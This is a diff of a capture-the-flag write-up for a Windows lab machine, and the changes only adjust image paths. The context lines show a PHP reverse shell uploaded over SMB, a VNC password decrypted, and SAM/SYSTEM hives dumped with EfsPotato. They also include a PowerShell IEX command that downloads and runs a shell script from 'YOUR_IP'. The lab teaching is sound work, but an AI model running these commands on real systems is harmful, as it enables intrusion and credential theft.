@@ -116,17 +116,17 @@ smb: \> ls
 
 Checking the web application uncovers the following source code:
 
-![Pasted image 20250916222051.png](Pasted%20image%2020250916222051.png)
+![Pasted image 20250916222051.png](../../IMAGES/Pasted%20image%2020250916222051.png)
 
 This HTML code creates a simple slideshow application that automatically cycles through images fetched from a server. The application uses jQuery to make an AJAX GET request to `/content.php`, which returns a JSON array containing image data. It calculates display timing (10 seconds per image), sets up an automatic page reload after all images have been shown, and uses the `changeImage()` function to sequentially update the image source attribute at timed intervals.
 
 Checking the `content.php` endpoint, uncovers the same that we saw on the images share:
 
-![Pasted image 20250916222056.png](Pasted%20image%2020250916222056.png)
+![Pasted image 20250916222056.png](../../IMAGES/Pasted%20image%2020250916222056.png)
 
 Also, the images directory contains the same as the share:
 
-![Pasted image 20250916222100.png](Pasted%20image%2020250916222100.png)
+![Pasted image 20250916222100.png](../../IMAGES/Pasted%20image%2020250916222100.png)
 
 Since we can upload files here, we could attempt to upload a webshell to execute commands on the server abusing the code we saw earlier, let's proceed with exploitation.
 
@@ -149,11 +149,11 @@ putting file shell.php as \shell.php (0.0 kb/s) (average 0.0 kb/s)
 
 Trying to execute code uncovers a `404` code:
 
-![Pasted image 20250916222107.png](Pasted%20image%2020250916222107.png)
+![Pasted image 20250916222107.png](../../IMAGES/Pasted%20image%2020250916222107.png)
 
 Without the cmd parameter, we get the following error:
 
-![Pasted image 20250916222113.png](Pasted%20image%2020250916222113.png)
+![Pasted image 20250916222113.png](../../IMAGES/Pasted%20image%2020250916222113.png)
 
 Seems like a webshell isn't working, but, if we upload a reverse shell, it works, use the one [here](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php): 
 
@@ -163,7 +163,7 @@ http://10.201.27.51/images/revshell.php
 
 Checking our listener uncovers the reverse shell worked:
 
-![Pasted image 20250916222119.png](Pasted%20image%2020250916222119.png)
+![Pasted image 20250916222119.png](../../IMAGES/Pasted%20image%2020250916222119.png)
 
 Let's begin privesc.
 
@@ -352,7 +352,7 @@ C:\Program Files\uvnc bvba\UltraVNC>dir
 
 Looking for a way to search for passwords in VNC, we come across this [repository](https://github.com/frizb/PasswordDecrypts):
 
-![Pasted image 20250916222134.png](Pasted%20image%2020250916222134.png)
+![Pasted image 20250916222134.png](../../IMAGES/Pasted%20image%2020250916222134.png)
 
 The machine uses `UltraVNC`, so we should find the hardcoded DES key there, let's check:
 
@@ -450,7 +450,7 @@ passwd2=00B2CDC0BADCAF1397
 
 Now the repo specifies the following:
 
-![Pasted image 20250916222142.png](Pasted%20image%2020250916222142.png)
+![Pasted image 20250916222142.png](../../IMAGES/Pasted%20image%2020250916222142.png)
 
 But that won't do on our case, we can use the following tool to do it:
 
@@ -458,7 +458,7 @@ http://aluigi.altervista.org/pwdrec/vncpwd.zip
 
 Make sure to upload the `.exe` file to the images share so we can access it on the revshell, you can also upload it in other ways but it doesn't matter, once you got it we can use it:
 
-![Pasted image 20250916222150.png](Pasted%20image%2020250916222150.png)
+![Pasted image 20250916222150.png](../../IMAGES/Pasted%20image%2020250916222150.png)
 
 Let's use the tool:
 
@@ -513,9 +513,9 @@ We got `SeImpersonatePrivilege`, if you've read previous writeups I've done, you
 
 Let's recall what I did in that one machine:
 
-![Pasted image 20250916222157.png](Pasted%20image%2020250916222157.png)
+![Pasted image 20250916222157.png](../../IMAGES/Pasted%20image%2020250916222157.png)
 
-![Pasted image 20250916222201.png](Pasted%20image%2020250916222201.png)
+![Pasted image 20250916222201.png](../../IMAGES/Pasted%20image%2020250916222201.png)
 
 I used `EfsPotato` to dump the SAM and SYSTEM in order to get the NTLM hash of the administrator user, let's attempt to do the following here, get `EfsPotato` from here:
 
@@ -533,7 +533,7 @@ Nice, we got the executable now, let's check if using it grants us `nt authority
 .\EfsPotato.exe "whoami"
 ```
 
-![Pasted image 20250916222208.png](Pasted%20image%2020250916222208.png)
+![Pasted image 20250916222208.png](../../IMAGES/Pasted%20image%2020250916222208.png)
 
 There we go, let's do the same as before then, let's copy the SAM and SYSTEM, do this:
 
@@ -568,7 +568,7 @@ c:\xampp\htdocs\images>dir
 
 Let's go to the images directory on the browser to get the files:
 
-![Pasted image 20250916222212.png](Pasted%20image%2020250916222212.png)
+![Pasted image 20250916222212.png](../../IMAGES/Pasted%20image%2020250916222212.png)
 
 Download them, once you got the files, we can use `impacket-secretsdump` to get the NTLM hash of the admin:
 
@@ -641,11 +641,11 @@ Now you need to host a python server and use `EfsPotato` to download and execute
 .\EfsPotato.exe "cmd /c powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/shell.ps1')""
 ```
 
-![Pasted image 20250916222218.png](Pasted%20image%2020250916222218.png)
+![Pasted image 20250916222218.png](../../IMAGES/Pasted%20image%2020250916222218.png)
 
 Make sure to set up a listener before doing this, if you did, you should receive a connection as `nt authority\system`:
 
-![Pasted image 20250916222221.png](Pasted%20image%2020250916222221.png)
+![Pasted image 20250916222221.png](../../IMAGES/Pasted%20image%2020250916222221.png)
 
 We can read the flag now:
 
@@ -716,5 +716,5 @@ What is the contents of the admin_flag.txt?
 thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
 ```
 
-![Pasted image 20250916222230.png](Pasted%20image%2020250916222230.png)
+![Pasted image 20250916222230.png](../../IMAGES/Pasted%20image%2020250916222230.png)
 
